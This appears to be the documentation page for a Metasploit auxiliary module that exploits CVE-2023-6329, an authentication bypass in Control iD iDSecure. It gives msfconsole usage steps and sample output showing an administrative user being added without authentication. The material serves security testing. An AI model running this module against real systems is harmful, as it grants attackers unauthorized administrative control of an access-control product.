## Vulnerable Application

This module exploits an improper access control vulnerability (CVE-2023-6329) in Control iD iDSecure <= v4.7.43.0. It allows an
unauthenticated remote attacker to compute valid credentials and to add a new administrative user to the web interface of the product.

The advisory from Tenable is available [here](https://www.tenable.com/security/research/tra-2023-36), which lists the affected version
4.7.32.0. According to the Solution section, the vendor has not responded to the contact attempts from Tenable. While creating this MSF
module, the latest version available was 4.7.43.0, which was confirmed to be still vulnerable.

## Testing

The software can be obtained from the [vendor](https://www.controlid.com.br/suporte/idsecure).

Deploy it by following the vendor's [documentation](https://www.controlid.com.br/docs/idsecure-en/).

**Successfully tested on**

- Control iD iDSecure v4.7.43.0 on Windows 10 22H2
- Control iD iDSecure v4.7.32.0 on Windows 10 22H2

## Verification Steps

1. Deploy Control iD iDSecure v4.7.43.0
2. Start `msfconsole`
3. `use auxiliary/admin/http/idsecure_auth_bypass`
4. `set RHOSTS <IP>`
5. `run`
6. A new administrative user should have been added to the web interface of the product.

## Options

### NEW_USER
The name of the new administrative user.

### NEW_PASSWORD
The password of the new administrative user.

## Scenarios

Running the module against Control iD iDSecure v4.7.43.0 should result in an output
similar to the following:

```
msf6 > use auxiliary/admin/http/idsecure_auth_bypass
msf6 auxiliary(admin/http/idsecure_auth_bypass) > set RHOSTS 192.168.137.196
[*] Running module against 192.168.137.196

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Version retrieved: 4.7.43.0
[+] The target appears to be vulnerable.
[+] Retrieved passwordRandom: <redacted>
[+] Retrieved serial: <redacted>
[*] Created passwordCustom: <redacted>
[+] Retrieved JWT accessToken: <redacted>
[+] New user 'h4x0r:Sup3rS3cr3t!' was successfully added.
[+] Login at: https://192.168.137.196:30443/#/login
[*] Auxiliary module execution completed

```
